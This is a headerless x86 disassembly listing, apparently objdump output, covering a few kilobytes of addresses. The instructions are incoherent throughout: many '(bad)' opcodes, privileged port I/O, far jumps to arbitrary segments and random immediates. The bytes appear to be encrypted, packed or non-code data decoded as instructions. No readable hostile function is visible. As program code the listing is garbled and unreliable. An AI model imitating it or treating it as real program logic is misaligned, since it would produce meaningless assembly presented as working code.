  405a88:	mov    ebp,DWORD PTR [eax+0x3a96d9c8]
  405a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a8f:	mov    edx,0xa4deeb4c
  405a94:	dec    ebx
  405a95:	add    eax,0x614acaf6
  405a9a:	mov    edx,0x86158b3a
  405a9f:	jmp    0xc52b:0xa5eba929
  405aa6:	cmp    eax,0x6139e708
  405aab:	das    
  405aac:	xchg   edi,eax
  405aad:	or     BYTE PTR [ebp-0x14],0x71
  405ab1:	aaa    
  405ab2:	mov    esi,0xf8c0e0f1
  405ab7:	jmp    0x405a94
  405ab9:	les    ebp,FWORD PTR [ebx-0x21]
  405abc:	pop    eax
  405abd:	and    DWORD PTR [esi],ebp
  405abf:	jp     0x405ae3
  405ac1:	jne    0x405a9e
  405ac3:	or     edx,ebp
  405ac5:	lahf   
  405ac6:	mov    ebp,0x10e3933c
  405acb:	jo     0x405b06
  405acd:	and    BYTE PTR [ebp+eax*1+0x435bfe5d],bh
  405ad4:	xlat   BYTE PTR ds:[ebx]
  405ad5:	add    BYTE PTR [edi],bh
  405ad7:	scas   eax,DWORD PTR es:[edi]
  405ad8:	pop    ecx
  405ad9:	cld    
  405ada:	pop    ebx
  405adb:	aad    0xd3
  405add:	inc    ebx
  405ade:	xor    dl,BYTE PTR [esi+0x4fe2e69f]
  405ae4:	pop    ecx
  405ae5:	dec    edx
  405ae6:	mov    ebp,0xc2a4c1de
  405aeb:	stos   BYTE PTR es:[edi],al
  405aec:	inc    edx
  405aed:	lahf   
  405aee:	mov    WORD PTR [ebx],es
  405af0:	adc    al,0x7b
  405af2:	inc    ebp
  405af3:	or     bh,ch
  405af5:	pop    es
  405af6:	in     al,dx
  405af7:	inc    eax
  405af8:	mov    WORD PTR [esi],ds
  405afa:	aas    
  405afb:	fisub  WORD PTR ds:0x62752f1c
  405b01:	sar    BYTE PTR [edx+0x7d],1
  405b04:	sub    DWORD PTR [ebx+0x5c],edi
  405b07:	shl    BYTE PTR [edi+0x49574988],0x38
  405b0e:	pop    ds
  405b0f:	es (bad) 
  405b11:	mov    al,0x22
  405b13:	es int3 
  405b15:	cmp    BYTE PTR [eax+0x5c1f54dd],ah
  405b1b:	into   
  405b1c:	arpl   WORD PTR [esi+0x7f],sp
  405b1f:	lods   eax,DWORD PTR ds:[esi]
  405b20:	jne    0x405b82
  405b22:	or     DWORD PTR [eax+0x5191e4a5],esp
  405b28:	mov    eax,DWORD PTR [esi]
  405b2a:	ss hlt 
  405b2c:	pop    esp
  405b2d:	lds    edx,FWORD PTR ds:[eax]
  405b30:	imul   ecx,DWORD PTR [eax-0x2b],0x4c422213
  405b37:	data16 cmp cx,WORD PTR [ecx-0x75]
  405b3c:	mov    cl,0x16
  405b3e:	(bad)  [edi+ebp*2]
  405b41:	mov    ebp,DWORD PTR [edi-0x41]
  405b44:	and    ecx,esi
  405b46:	adc    BYTE PTR [edi+0x9],cl
  405b49:	div    BYTE PTR [edx]
  405b4b:	nop
  405b4c:	sahf   
  405b4d:	jns    0x405b55
  405b4f:	js     0x405af5
  405b51:	dec    edi
  405b52:	test   bh,ah
  405b54:	dec    eax
  405b55:	int3   
  405b56:	aam    0x10
  405b58:	mov    dl,0x86
  405b5a:	test   BYTE PTR [esi+0x6e],bh
  405b5d:	cwde   
  405b5e:	push   edi
  405b5f:	ret    0x54c9
  405b62:	sub    ecx,DWORD PTR [ecx-0x2fca5a8c]
  405b68:	lds    esi,FWORD PTR [edi-0x64d722ae]
  405b6e:	pop    ss
  405b6f:	mov    esp,?
  405b71:	xchg   DWORD PTR [ecx],esp
  405b73:	jns    0x405bcc
  405b75:	cs dec edx
  405b77:	pop    esp
  405b78:	mov    ds:0x996a61ea,al
  405b7d:	pop    eax
  405b7e:	loop   0x405b45
  405b80:	adc    ebp,DWORD PTR [edx+0x1c1eb9df]
  405b86:	xchg   esp,eax
  405b87:	iret   
  405b88:	adc    eax,DWORD PTR [edx+0x53]
  405b8b:	pushf  
  405b8c:	fwait
  405b8d:	mov    ah,0x87
  405b8f:	fdiv   st(2),st
  405b91:	pushf  
  405b92:	or     esi,edi
  405b94:	cmp    edx,DWORD PTR [eax+0xb]
  405b97:	add    BYTE PTR [edx-0x6d1d985e],0xd0
  405b9e:	fistp  DWORD PTR [ecx+0x36fd7e2]
  405ba4:	inc    ebp
  405ba5:	jns    0x405b7a
  405ba7:	call   0xcb778b8a
  405bac:	mov    ds:0xd4c3e1e3,al
  405bb1:	jmp    0x2a8b:0xaa98154b
  405bb8:	(bad)  
  405bba:	add    eax,0x7329c1a1
  405bbf:	aad    0x37
  405bc1:	xor    bl,BYTE PTR [ebx]
  405bc3:	cmp    ch,BYTE PTR [ebx+0x7eda294]
  405bc9:	in     al,dx
  405bca:	push   edx
  405bcb:	lods   eax,DWORD PTR ds:[esi]
  405bcc:	add    ch,BYTE PTR [esi-0x2f]
  405bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bd0:	ins    BYTE PTR es:[edi],dx
  405bd1:	ins    DWORD PTR es:[edi],dx
  405bd2:	pop    ds
  405bd3:	fs inc ebx
  405bd5:	xchg   ecx,eax
  405bd6:	sar    DWORD PTR [ebx],1
  405bd8:	dec    eax
  405bd9:	in     eax,0x37
  405bdb:	fdiv   QWORD PTR [ecx-0x2f4196ba]
  405be1:	int    0xc9
  405be3:	push   edi
  405be4:	xor    DWORD PTR [ecx],esi
  405be6:	ror    BYTE PTR [esp+esi*8+0x58],cl
  405bea:	dec    esi
  405beb:	bound  edx,QWORD PTR [ecx]
  405bed:	push   eax
  405bee:	in     eax,dx
  405bef:	out    0x2f,al
  405bf1:	jnp    0x405c72
  405bf3:	call   0xeeeb2150
  405bf8:	rol    DWORD PTR [ebp+0x18c76dbe],0x9d
  405bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c00:	test   eax,0xd45336c7
  405c05:	dec    ebp
  405c06:	or     bl,BYTE PTR [ebp+0x1c]
  405c09:	pop    es
  405c0a:	test   al,0x3c
  405c0c:	inc    edx
  405c0d:	das    
  405c0e:	push   ss
  405c0f:	and    ebx,0xffffffcf
  405c12:	xchg   ebx,eax
  405c13:	xchg   esp,eax
  405c14:	cld    
  405c15:	jae    0x405bda
  405c17:	dec    esp
  405c18:	add    eax,0x367084ac
  405c1d:	cmp    bh,cl
  405c1f:	pop    edi
  405c20:	push   ds
  405c21:	(bad)  
  405c22:	push   edx
  405c23:	xor    dh,BYTE PTR ss:[esi-0x16]
  405c27:	leave  
  405c28:	xor    eax,edi
  405c2a:	jnp    0x405c99
  405c2c:	adc    bl,bh
  405c2e:	and    al,0xbf
  405c30:	sub    eax,0x79b7d545
  405c35:	mov    eax,ds:0xf01640a8
  405c3a:	repz aad 0xd9
  405c3d:	push   cs
  405c3e:	lods   eax,DWORD PTR ds:[esi]
  405c3f:	neg    DWORD PTR [eax+0x496e52f]
  405c45:	sbb    eax,DWORD PTR [ebx-0x4b]
  405c48:	jmp    0x405bcb
  405c4a:	pushf  
  405c4b:	sbb    al,0xfd
  405c4d:	in     eax,dx
  405c4e:	inc    edx
  405c4f:	dec    ebx
  405c50:	loope  0x405c1d
  405c52:	mov    WORD PTR [ebp+0x7d6a9560],cs
  405c58:	jmp    0x405c69
  405c5a:	pop    ss
  405c5b:	sbb    al,dl
  405c5d:	shl    BYTE PTR [edx+ecx*4-0xa],0xb2
  405c62:	in     eax,0x1f
  405c64:	sbb    BYTE PTR ds:0xa841645f,dl
  405c6a:	mov    ebp,ss
  405c6c:	pop    ebp
  405c6d:	cdq    
  405c6e:	aas    
  405c6f:	add    cl,BYTE PTR ds:0x3b1c45c7
  405c75:	int    0x35
  405c77:	cmovnp esp,DWORD PTR [edi+0x11]
  405c7b:	cwde   
  405c7c:	adc    ah,BYTE PTR [edi-0x25bd3220]
  405c82:	mov    esi,0xe39dada4
  405c87:	sbb    DWORD PTR [edx-0x48ea79cb],edi
  405c8d:	mov    BYTE PTR [esi],0x43
  405c90:	fs pop edi
  405c92:	fsubr  st,st(2)
  405c94:	retf   0x7153
  405c97:	inc    esi
  405c98:	adc    al,0x70
  405c9a:	scas   eax,DWORD PTR es:[edi]
  405c9b:	loop   0x405d15
  405c9d:	ins    DWORD PTR es:[edi],dx
  405c9e:	mov    eax,ds:0x3e0dfe45
  405ca3:	pop    es
  405ca4:	stos   BYTE PTR es:[edi],al
  405ca5:	mov    eax,0x3de3ca1b
  405caa:	mov    esi,0x34e2f208
  405caf:	dec    esp
  405cb0:	mov    ds:0xbe6dde5e,al
  405cb5:	int    0x35
  405cb7:	add    al,0x77
  405cb9:	fnsave [esi-0x20]
  405cbc:	test   al,0xb
  405cbe:	jmp    0x405d1d
  405cc0:	sub    BYTE PTR [ebp+esi*8-0x1fe7a2eb],bh
  405cc7:	dec    ebp
  405cc8:	mov    bh,0xd7
  405cca:	int3   
  405ccb:	mov    ecx,0x25b62116
  405cd0:	mov    dh,BYTE PTR [eax-0x3400cb04]
  405cd6:	retf   
  405cd7:	sub    DWORD PTR [esi+0xe],ebx
  405cda:	mov    ch,0xc7
  405cdc:	es jae 0x405cb3
  405cdf:	mov    ah,0xb4
  405ce1:	inc    ebp
  405ce2:	cs mov ah,ah
  405ce5:	ja     0x405c9e
  405ce7:	jnp    0x405cb3
  405ce9:	out    0x4c,al
  405ceb:	nop
  405cec:	push   edi
  405ced:	pop    esi
  405cee:	cmp    al,BYTE PTR [esp+edi*2-0x34]
  405cf2:	mov    eax,DWORD PTR [ecx+ecx*2+0x27]
  405cf6:	out    0x6,eax
  405cf8:	push   eax
  405cf9:	(bad)  
  405cfa:	iret   
  405cfb:	sbb    DWORD PTR [ebx-0x7b],eax
  405cfe:	data16 (bad) 
  405d00:	test   BYTE PTR ds:0xfb9af625,bh
  405d06:	jnp    0x405d67
  405d08:	push   edi
  405d09:	outs   dx,BYTE PTR ds:[esi]
  405d0a:	lods   al,BYTE PTR ds:[esi]
  405d0b:	ss xchg esi,eax
  405d0d:	repz or al,0xc0
  405d10:	pop    es
  405d11:	sbb    esp,0x2a2c3659
  405d17:	cmp    al,0x46
  405d19:	shl    al,cl
  405d1b:	or     eax,DWORD PTR [esi+0x3cf3274f]
  405d21:	mov    ds:0xc94af209,eax
  405d26:	mov    ecx,0x8a665d8c
  405d2b:	and    DWORD PTR [ebx],esp
  405d2d:	ror    esi,1
  405d2f:	daa    
  405d30:	imul   eax,esp,0xffffffcc
  405d33:	xor    eax,0x6dbd6606
  405d38:	cmp    ecx,edx
  405d3a:	or     ecx,DWORD PTR ds:0xd6ee828e
  405d40:	adc    DWORD PTR [edx-0x45],0xfffffff7
  405d44:	sub    BYTE PTR [edx-0x1a641ae5],dl
  405d4a:	(bad)  
  405d4b:	int3   
  405d4c:	ins    BYTE PTR es:[edi],dx
  405d4d:	pop    es
  405d4e:	out    0x42,al
  405d50:	xor    eax,0xb5581d85
  405d55:	or     ebp,edx
  405d57:	and    DWORD PTR [edi+0x49],0xffffff84
  405d5b:	dec    eax
  405d5c:	push   es
  405d5d:	xor    bh,dl
  405d5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d60:	dec    eax
  405d61:	jmp    0x2279b606
  405d66:	rcr    BYTE PTR [eax+0x5e],0x4b
  405d6a:	fwait
  405d6b:	call   0xfc0f9985
  405d70:	in     al,dx
  405d71:	(bad)  
  405d72:	js     0x405db3
  405d74:	add    al,0xd9
  405d76:	xchg   edx,eax
  405d78:	dec    eax
  405d79:	dec    ebx
  405d7a:	adc    DWORD PTR [ebp+edi*2-0x64],esi
  405d7e:	jbe    0x405d35
  405d80:	jmp    0x405d5d
  405d82:	jne    0x405d75
  405d84:	pop    es
  405d85:	sub    dh,BYTE PTR [eax]
  405d87:	sub    ebp,DWORD PTR [esp+esi*4+0x73]
  405d8b:	dec    ecx
  405d8c:	sbb    eax,0xffab67d0
  405d91:	out    0x7,al
  405d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d94:	cmp    ch,BYTE PTR [ecx]
  405d96:	arpl   dx,ax
  405d98:	shr    esi,cl
  405d9a:	or     bh,BYTE PTR [ebx+0x31]
  405d9d:	add    DWORD PTR [esi+0x6d],edi
  405da0:	icebp  
  405da1:	out    dx,al
  405da2:	ret    
  405da3:	inc    esp
  405da4:	jmp    0x7909f0c7
  405da9:	sub    edx,edi
  405dab:	scas   eax,DWORD PTR es:[edi]
  405dac:	pop    esi
  405dad:	push   0xffffffc7
  405daf:	or     al,BYTE PTR [esi+0x2bdb3f50]
  405db5:	in     eax,dx
  405db6:	popa   
  405db7:	je     0x405d5e
  405db9:	sar    BYTE PTR [ecx+0x21],0x5e
  405dbd:	stos   BYTE PTR es:[edi],al
  405dbe:	mov    bh,0xdc
  405dc0:	int    0xa5
  405dc2:	in     eax,dx
  405dc3:	std    
  405dc4:	xor    bl,dh
  405dc6:	sub    eax,0xd7136ed6
  405dcb:	pop    edi
  405dcc:	jnp    0x405e13
  405dce:	jbe    0x405e4b
  405dd0:	mov    ds:0x666f2dde,eax
  405dd5:	mov    esi,0x70c4f353
  405dda:	das    
  405ddb:	xlat   BYTE PTR ds:[ebx]
  405ddd:	and    bl,BYTE PTR [eax+0x7b]
  405de0:	push   esi
  405de1:	mov    bl,0x59
  405de3:	xor    eax,0xc1fda558
  405de8:	je     0x405e5d
  405dea:	mov    bh,BYTE PTR [ecx-0x2f596980]
  405df0:	imul   ebx,DWORD PTR [edx-0x7],0xfffffff6
  405df4:	shl    DWORD PTR [ebx],cl
  405df6:	cmp    al,0x7c
  405df8:	iret   
  405df9:	adc    edx,DWORD PTR [esi+0x44]
  405dfc:	sub    al,0xdb
  405dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dff:	sti    
  405e00:	ret    0xd69
  405e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e05:	icebp  
  405e06:	and    DWORD PTR [edi+edi*2-0x7b],esi
  405e0a:	or     ah,BYTE PTR [ecx+0x75524a18]
  405e10:	fidiv  WORD PTR [edi]
  405e12:	aam    0x89
  405e14:	add    ch,dh
  405e16:	fxtract 
  405e18:	(bad)  [edi+0x21]
  405e1b:	mov    esi,0xecfeb164
  405e20:	clc    
  405e21:	push   0x39
  405e23:	xchg   ecx,eax
  405e24:	and    bh,BYTE PTR [edi]
  405e26:	inc    ebp
  405e27:	(bad)  
  405e28:	mov    dh,0x8e
  405e2a:	arpl   WORD PTR [edi+0x791c12aa],sp
  405e30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e31:	nop
  405e32:	push   es
  405e33:	xchg   ecx,eax
  405e34:	cmp    BYTE PTR [edx+0x7d99aab8],ch
  405e3a:	or     DWORD PTR [esi+0x13],eax
  405e3d:	push   ds
  405e3e:	or     eax,0x79167157
  405e43:	jnp    0x405e1c
  405e45:	fbld   TBYTE PTR [ebp+0x59]
  405e48:	in     al,0x44
  405e4a:	jbe    0x405e1a
  405e4c:	shr    DWORD PTR [ecx],cl
  405e4e:	ficom  WORD PTR [eax]
  405e50:	sbb    ah,BYTE PTR [eax]
  405e52:	rcl    dl,1
  405e54:	xchg   edx,eax
  405e55:	mov    edi,0x8ba835c2
  405e5a:	jo     0x405e16
  405e5c:	test   eax,0x6e9ed742
  405e61:	push   cs
  405e62:	pop    ebp
  405e63:	rcr    DWORD PTR [ebp-0x3],0x9c
  405e67:	popf   
  405e68:	xchg   esi,eax
  405e69:	(bad)  
  405e6b:	cs loope 0x405e7c
  405e6e:	scas   al,BYTE PTR es:[edi]
  405e6f:	daa    
  405e70:	xchg   BYTE PTR [edx-0x7a],bh
  405e73:	mov    bl,BYTE PTR [ebx]
  405e75:	pushf  
  405e76:	popf   
  405e77:	xchg   edx,eax
  405e78:	les    eax,FWORD PTR [edi-0x665134b3]
  405e7e:	sub    esp,DWORD PTR [esi-0x1a71e7aa]
  405e84:	pop    esp
  405e85:	icebp  
  405e86:	adc    DWORD PTR [ebp+ebp*4-0x65],esp
  405e8a:	pop    ecx
  405e8b:	dec    eax
  405e8c:	(bad)  
  405e8d:	or     al,0x59
  405e8f:	pusha  
  405e90:	inc    esi
  405e91:	scas   al,BYTE PTR es:[edi]
  405e92:	ror    BYTE PTR [ebp+edi*2-0x7db5d473],cl
  405e99:	inc    ebx
  405e9a:	les    edx,FWORD PTR [esi+0x1ad3d75c]
  405ea0:	into   
  405ea1:	cmovo  esi,ebp
  405ea4:	pop    ss
  405ea5:	shr    DWORD PTR ds:0x61dca390,1
  405eab:	fs mov edx,0x311906c7
  405eb1:	popa   
  405eb2:	xchg   esp,eax
  405eb3:	xchg   ecx,eax
  405eb4:	je     0x405ea4
  405eb6:	aad    0x98
  405eb8:	(bad)
  405ebc:	les    esp,FWORD PTR [edi-0x1be52b6c]
  405ec2:	mov    ebp,0xf51f257c
  405ec7:	jbe    0x405f2e
  405ec9:	push   esi
  405eca:	imul   esi,DWORD PTR [esi+0x35],0x311463a5
  405ed1:	loopne 0x405e84
  405ed3:	add    bl,BYTE PTR [ebx+0x27]
  405ed6:	add    dh,BYTE PTR [edx+eiz*4]
  405ed9:	lds    edi,FWORD PTR [eax-0xcd44ac3]
  405edf:	fcomp  QWORD PTR [eax+eax*8]
  405ee2:	jmp    0x79bb:0x407a5f4f
  405ee9:	xor    ebx,esp
  405eeb:	lea    edi,[ecx+edx*4+0x23]
  405eef:	in     al,dx
  405ef0:	(bad)  
  405ef1:	jnp    0x405e98
  405ef3:	sub    DWORD PTR [ecx],esp
  405ef5:	xchg   ebx,eax
  405ef6:	fcomp  DWORD PTR [edx-0x2a]
  405ef9:	pusha  
  405efa:	sar    ecx,0xc2
  405efd:	loope  0x405f2b
  405eff:	or     DWORD PTR [eiz*8+0x65b05033],esi
  405f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f07:	add    al,0x73
  405f09:	and    cl,BYTE PTR [ebx-0x65]
  405f0c:	add    BYTE PTR [ebx+ebx*2-0x28],ah
  405f10:	push   ebx
  405f11:	mov    ebp,edi
  405f13:	mov    esp,0x814bb29f
  405f18:	adc    al,0x88
  405f1a:	cmp    bl,BYTE PTR [ebx+0x66]
  405f1d:	in     al,dx
  405f1e:	out    0xb,eax
  405f20:	punpckhdq mm1,QWORD PTR [ebp-0x5345f672]
  405f27:	in     al,dx
  405f28:	clc    
  405f29:	adc    edx,DWORD PTR [ebp+0x39]
  405f2c:	push   ds
  405f2d:	mov    dl,0x6e
  405f2f:	inc    ebx
  405f30:	lds    ebp,FWORD PTR [edi+0x2e]
  405f33:	sub    eax,0x630a094
  405f38:	not    BYTE PTR [edx+0x3b]
  405f3b:	loope  0x405fb1
  405f3d:	add    BYTE PTR [ebx],bl
  405f3f:	inc    ebx
  405f40:	out    dx,al
  405f41:	in     al,dx
  405f42:	call   0x9616:0xa629082
  405f49:	xchg   BYTE PTR [ebx-0x3],cl
  405f4c:	add    BYTE PTR [edi-0xc653cf3],dl
  405f52:	sub    al,dh
  405f54:	push   0xf2dd5c64
  405f59:	jb     0x405f72
  405f5b:	xchg   ebx,eax
  405f5c:	fbld   TBYTE PTR [esi-0x1e]
  405f5f:	dec    edx
  405f60:	mov    al,ds:0xd870b1dd
  405f65:	scas   al,BYTE PTR es:[edi]
  405f66:	mov    ds:0xd7fa25bd,eax
  405f6b:	stos   BYTE PTR es:[edi],al
  405f6c:	jmp    0x405fb7
  405f6e:	jg     0x405f28
  405f70:	inc    ebp
  405f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f72:	imul   ecx,esi,0x9
  405f75:	sbb    al,0xfb
  405f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f78:	imul   esi,DWORD PTR [edi+0x28],0xffffffe2
  405f7c:	inc    edi
  405f7d:	gs jg  0x405f55
  405f80:	or     BYTE PTR [ecx+0x13598f00],dh
  405f86:	jg     0x405f45
  405f88:	iret   
  405f89:	ret    
  405f8a:	outs   dx,DWORD PTR ds:[esi]
  405f8b:	mov    cl,0xdc
  405f8d:	mov    ?,edx
  405f8f:	cmp    BYTE PTR [esi],dh
  405f91:	xchg   edi,eax
  405f92:	je     0x405fcf
  405f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f95:	xor    al,0x93
  405f97:	cmp    DWORD PTR [esi+ebp*8],esp
  405f9a:	scas   al,BYTE PTR es:[edi]
  405f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f9c:	dec    ebp
  405f9d:	scas   eax,DWORD PTR es:[edi]
  405f9e:	add    al,dl
  405fa0:	repz (bad) 
  405fa2:	sub    eax,0x2e357422
  405fa7:	dec    edi
  405fa8:	or     DWORD PTR [ebp-0x3d],ebx
  405fab:	or     eax,0x6b77623b
  405fb0:	xchg   ecx,eax
  405fb1:	push   es
  405fb2:	out    0x2f,al
  405fb4:	call   0xa630:0x7b6301c9
  405fbb:	fcomp  DWORD PTR [ebx-0xc]
  405fbe:	test   DWORD PTR [eax],edx
  405fc0:	add    ecx,DWORD PTR [edx-0x1348aab6]
  405fc6:	stos   BYTE PTR es:[edi],al
  405fc7:	push   edi
  405fc8:	and    al,0x34
  405fca:	inc    esi
  405fcb:	inc    esp
  405fcc:	mov    bl,0x23
  405fce:	jbe    0x40603e
  405fd0:	xchg   BYTE PTR [ecx-0x18],bl
  405fd3:	mov    WORD PTR [ebp+0x17],ss
  405fd6:	cmp    bh,BYTE PTR [eax-0x38a24a25]
  405fdc:	lods   eax,DWORD PTR ds:[esi]
  405fdd:	push   0x46296005
  405fe2:	xchg   DWORD PTR [ecx],esi
  405fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fe5:	std    
  405fe6:	out    0x7d,al
  405fe8:	hlt    
  405fe9:	shr    DWORD PTR [edi],0x7f
  405fec:	push   edi
  405fed:	sahf   
  405fee:	push   esi
  405fef:	rol    DWORD PTR [edx+0x5e],1
  405ff2:	pop    edx
  405ff3:	xchg   ebp,eax
  405ff4:	mov    ebx,0x20c9c927
  405ff9:	and    eax,0xd4b34245
  405ffe:	or     DWORD PTR [esi+0xd],0xffffffa2
  406002:	mov    al,0x6f
  406004:	loopne 0x40601e
  406006:	fcom   st(4)
  406008:	adc    al,0x60
  40600a:	into   
  40600b:	(bad)  
  40600c:	fdivr  QWORD PTR [eax-0x17879184]
  406012:	mov    ebp,0x8086f65
  406017:	push   edx
  406018:	jne    0x406090
  40601a:	inc    edx
  40601b:	cdq    
  40601c:	or     DWORD PTR [ebx-0xa2132d8],edx
  406022:	sti    
  406023:	sbb    bl,BYTE PTR [eax]
  406025:	mov    DWORD PTR [esp+ecx*8-0x28595e7b],ecx
  40602c:	gs inc ebx
  40602e:	and    BYTE PTR [ebx+ebp*1+0x36],cl
  406032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406033:	sub    BYTE PTR [edx],al
  406035:	sbb    al,0x11
  406037:	pop    esp
  406038:	fwait
  406039:	ds cwde 
  40603b:	adc    bl,BYTE PTR [edx]
  40603d:	cli    
  40603e:	or     al,0xc9
  406040:	mov    ah,dh
  406042:	push   eax
  406043:	jbe    0x40608a
  406045:	repnz xchg ebx,eax
  406047:	repz pop edi
  406049:	mov    cl,0xb8
  40604b:	xor    al,0x2a
  40604d:	dec    edx
  40604e:	sbb    eax,0x82545443
  406053:	shr    edx,0x7
  406056:	out    dx,al
  406057:	push   es
  406058:	mov    WORD PTR [ebp-0x61],ss
  40605b:	fwait
  40605c:	in     al,dx
  40605d:	loopne 0x4060a2
  40605f:	or     DWORD PTR ds:0xb9b78e0f,0x75b672c8
  406069:	or     ch,BYTE PTR [ebx-0x5cc48ccf]
  40606f:	inc    ebp
  406070:	pop    ebx
  406071:	sti    
  406072:	fst    QWORD PTR [ecx-0x45]
  406075:	xchg   edx,eax
  406076:	xchg   esp,eax
  406077:	sahf   
  406078:	dec    ebp
  406079:	jp     0x406005
  40607b:	aad    0xd0
  40607d:	dec    esi
  40607e:	imul   edi,DWORD PTR [ebx-0xf],0xffffff81
  406082:	mov    ecx,DWORD PTR [edx-0x4f8c2aa6]
  406088:	and    eax,0xffad98f8
  40608d:	sahf   
  40608e:	adc    bh,al
  406090:	xor    al,0xa8
  406092:	inc    edx
  406093:	xchg   esp,eax
  406094:	sub    eax,ecx
  406096:	leave  
  406097:	nop
  406098:	inc    edi
  406099:	sub    ebp,edi
  40609b:	adc    ebp,DWORD PTR [ebx+ebp*8+0x54b0d25a]
  4060a2:	sub    ebx,DWORD PTR [edi+0x3f]
  4060a5:	popf   
  4060a6:	jae    0x406095
  4060a8:	data16 sti 
  4060aa:	aas    
  4060ab:	xor    BYTE PTR [esi],dh
  4060ad:	inc    edx
  4060ae:	or     al,0x60
  4060b0:	lahf   
  4060b1:	jecxz  0x406051
  4060b3:	aaa    
  4060b4:	adc    ebp,DWORD PTR [eax+edx*2+0x29]
  4060b8:	sub    al,0x9a
  4060ba:	mov    DWORD PTR [ecx],edi
  4060bc:	or     DWORD PTR [ebx-0x360ce1f4],0x42
  4060c3:	icebp  
  4060c4:	sbb    DWORD PTR [ecx+0x58377710],0x64
  4060cb:	mov    cl,0x3c
  4060cd:	sub    ch,dh
  4060cf:	jno    0x406135
  4060d1:	(bad)  
  4060d2:	push   ds
  4060d3:	sub    edi,edx
  4060d5:	popa   
  4060d6:	or     al,0x8
  4060d8:	push   ebx
  4060d9:	jl     0x4060ef
  4060db:	ror    DWORD PTR [eax+0x4b],0x53
  4060df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060e0:	aas    
  4060e1:	imul   edx,esi,0xffffff8f
  4060e4:	jmp    0x4060c2
  4060e6:	jnp    0x40611f
  4060e8:	ficom  DWORD PTR [ecx+0x5cd3caa9]
  4060ee:	xchg   DWORD PTR [eax],ebp
  4060f0:	call   0xf42d:0x5ba28fbc
  4060f7:	adc    al,BYTE PTR [eax]
  4060f9:	sub    bl,BYTE PTR [eax-0x13e4a557]
  4060ff:	mov    esp,DWORD PTR [ebx-0x6ef37e41]
  406105:	and    al,0xc2
  406107:	mov    bh,0x2b
  406109:	mov    es,WORD PTR [eax-0x5888c353]
  40610f:	into   
  406110:	imul   eax,esi,0x72
  406113:	loope  0x40613a
  406115:	mov    al,ds:0x3783fa34
  40611a:	mov    dl,0x15
  40611c:	and    DWORD PTR [edx],ebx
  40611e:	dec    esp
  40611f:	cdq    
  406120:	jns    0x4060ff
  406122:	fisttp DWORD PTR [ebp+0x31]
  406125:	and    al,0xf6
  406127:	ffree  st(5)
  406129:	xchg   esi,eax
  40612a:	shl    BYTE PTR [edi],1
  40612c:	mov    esi,0xece6e717
  406131:	add    al,0xe6
  406133:	minps  xmm2,XMMWORD PTR [esi]
  406136:	dec    ecx
  406137:	mov    bl,0xa0
  406139:	push   esp
  40613a:	adc    BYTE PTR [ebp+0x72],al
  40613d:	call   0x255128b8
  406142:	das    
  406143:	xchg   BYTE PTR [edx],bl
  406145:	sbb    eax,0x534c3d85
  40614a:	sahf   
  40614b:	(bad)  
  40614c:	and    edi,DWORD PTR [edx]
  40614e:	xor    esi,0x201cb400
  406154:	dec    edx
  406155:	inc    ebp
  406156:	xor    eax,0x9e42635a
  40615b:	(bad)  
  40615d:	dec    edi
  40615e:	int3   
  40615f:	sub    eax,0x68409693
  406164:	push   ecx
  406165:	dec    esp
  406166:	pop    ecx
  406167:	iret   
  406168:	fmul   QWORD PTR [ecx-0x1ea3555a]
  40616e:	jp     0x4061af
  406170:	inc    edx
  406171:	ja     0x40613b
  406173:	enter  0xf37a,0x94
  406177:	enter  0x30d2,0xb4
  40617b:	mov    es,WORD PTR [ebx+esi*2]
  40617e:	xor    DWORD PTR [ecx-0x7c],0x6
  406182:	ror    DWORD PTR [ebp-0x16],1
  406185:	icebp  
  406186:	adc    BYTE PTR [edx+0x18],ah
  406189:	xchg   BYTE PTR [ebx+ecx*8],dh
  40618c:	dec    esi
  40618d:	outs   dx,BYTE PTR fs:[esi]
  40618f:	arpl   WORD PTR [ebx+0x39],si
  406192:	sub    ecx,DWORD PTR [edx]
  406194:	or     al,BYTE PTR ds:0xd2805abf
  40619a:	loop   0x406154
  40619c:	les    esi,FWORD PTR ds:0x577d18b4
  4061a2:	mov    al,0xce
  4061a4:	aad    0x2b
  4061a6:	in     eax,dx
  4061a7:	or     al,0x57
  4061a9:	xor    ecx,eax
  4061ab:	dec    ebx
  4061ac:	cwde   
  4061ad:	mov    ch,0xe1
  4061af:	push   ebx
  4061b0:	jmp    0x5bbab006
  4061b5:	sub    ebx,ecx
  4061b7:	gs aaa 
  4061b9:	shl    BYTE PTR [edx+0x78],cl
  4061bc:	jo     0x40617a
  4061be:	push   ebp
  4061bf:	inc    eax
  4061c0:	mov    bh,0x4c
  4061c2:	sub    al,0x6b
  4061c4:	in     al,dx
  4061c5:	jbe    0x4061b0
  4061c7:	push   edx
  4061c8:	ret    
  4061c9:	loopne 0x406182
  4061cb:	ror    BYTE PTR [ebx],1
  4061cd:	push   ebx
  4061ce:	pop    es
  4061cf:	(bad)  
  4061d0:	in     al,0x49
  4061d2:	ins    DWORD PTR es:[edi],dx
  4061d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061d4:	loopne 0x40616e
  4061d6:	xor    DWORD PTR [edi+ebx*4],ebx
  4061d9:	dec    eax
  4061da:	cli    
  4061db:	std    
  4061dc:	stos   DWORD PTR es:[edi],eax
  4061dd:	or     DWORD PTR [eax+0x30],ebp
  4061e0:	add    eax,DWORD PTR [esi]
  4061e2:	aad    0x20
  4061e4:	sbb    eax,0x810b6d78
  4061e9:	scas   al,BYTE PTR es:[edi]
